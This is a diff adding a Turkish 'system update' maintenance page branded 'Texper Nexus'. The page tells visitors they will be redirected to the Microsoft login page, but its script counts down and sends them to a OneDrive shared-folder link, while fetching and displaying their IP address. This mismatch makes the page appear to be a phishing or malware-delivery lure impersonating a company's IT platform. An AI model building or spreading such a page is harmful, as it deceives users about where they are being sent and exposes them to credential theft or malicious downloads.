@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Texper Nexus - Sistem Güncellemesi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/animate.css">
+    <link rel="stylesheet" href="css/icomoon.css">
+    <link rel="stylesheet" href="css/bootstrap.css">
+    <link rel="stylesheet" href="css/flexslider.css">
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        /* Genel Stiller (Texper'a Uygun) */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f8f9fa;
+            color: #343a40;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .maintenance-container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            text-align: center;
+            width: 90%;
+            max-width: 700px;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 2.5em;
+            color: #007bff;
+            /* Texper mavisi */
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        h1 {
+            color: #343a40;
+            font-size: 2.2em;
+            margin-bottom: 20px;
+            animation: fadeInUp 1s ease-out;
+        }
+
+        .info-box {
+            background-color: #e9ecef;
+            color: #495057;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            text-align: left;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .info-box h2 {
+            font-size: 1.2em;
+            margin-bottom: 10px;
+            color: #007bff;
+        }
+
+        .info-box p {
+            font-size: 0.95em;
+            line-height: 1.6;
+        }
+
+        .progress-bar-container {
+            background-color: #ced4da;
+            height: 12px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            overflow: hidden;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%; /* Başlangıçta 0% */
+            background-color: #007bff;
+            border-radius: 6px;
+            transition: width 0.5s linear; /* Daha hızlı ve doğrusal geçiş */
+        }
+
+        .timer {
+            font-size: 1.1em;
+            color: #6c757d;
+            margin-bottom: 15px;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .redirect-message {
+            font-size: 0.9em;
+            color: #007bff;
+            margin-top: 20px;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .back-button {
+            display: inline-block;
+            padding: 12px 24px;
+            background-color: #007bff;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 8px;
+            margin-top: 30px;
+            animation: slideInBottom 1s ease-out;
+            font-weight: 500;
+        }
+
+        .back-button:hover {
+            background-color: #0056b3;
+        }
+
+        /* IP Adresi Alanı */
+        .ip-address {
+            font-size: 0.9em;
+            color: #495057;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dee2e6;
+        }
+
+        /* Animasyonlar */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideInBottom {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+    </style>
+    <script>
+        const redirectUrl =
+            "https://1drv.ms/f/c/d9e2670e00da7b49/Er2Imf5OLiNIkOE2izrPC5YB8vlZrXabzwxQ9IpKHTtmGA?e=8gifC8";
+        const redirectTime = 10; // 10 saniye
+
+        window.onload = function() {
+            let timerElement = document.getElementById('timer');
+            let progressBar = document.querySelector('.progress-bar');
+            let timeLeft = redirectTime;
+            let progressIncrement = (100 / redirectTime); // Her saniyede artacak miktar
+            let currentProgress = 0;
+
+            let countdown = setInterval(function() {
+                timeLeft--;
+                currentProgress += progressIncrement;
+                progressBar.style.width = `${currentProgress}%`; // İlerleme çubuğunu güncelle
+
+                timerElement.textContent = `Yönlendiriliyorsunuz: ${timeLeft} saniye`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    window.location.href = redirectUrl;
+                }
+            }, 1000);
+
+            // IP Adresi Alma (Basit Yöntem - Daha Gelişmiş API'ler Kullanılabilir)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address').textContent = `IP Adresiniz: ${data.ip}`;
+                })
+                .catch(error => console.error('IP adresi alınamadı:', error));
+        };
+    </script>
+</head>
+
+<body>
+    <div class="maintenance-container">
+        <div class="logo">Texper Nexus</div>
+        <h1>Sistem Güncellemesi</h1>
+
+        <div class="info-box">
+            <h2>Bilgi İşlem ve Bulut Platformu</h2>
+            <p>
+                Tex Nexus platformu, planlı bir güncelleme sürecindedir. Bu işlem, altyapımızı daha güvenli, hızlı ve verimli hale getirmeyi amaçlamaktadır. Güncelleme tamamlandıktan sonra, Microsoft giriş sayfasına otomatik olarak yönlendirileceksiniz.
+            </p>
+        </div>
+
+        <div class="progress-bar-container">
+            <div class="progress-bar"></div>
+        </div>
+
+        <div class="timer" id="timer">
+            Yönlendiriliyorsunuz: 10 saniye
+        </div>
+
+        <a href="index.html" class="back-button">Anasayfaya Dön</a>
+
+        <div class="ip-address" id="ip-address">
+            IP Adresi Alınıyor...
+        </div>
+
+        <p style="margin-top: 20px; font-size: 0.8em; color: #6c757d;">
+            Daha fazla bilgi için <a href="https://www.texperbilisim.com.tr/" target="_blank" style="color: #007bff;">Texper Bilişim</a> web sitesini ziyaret edebilirsiniz.
+        </p>
+    </div>
+</body>
+
+</html>
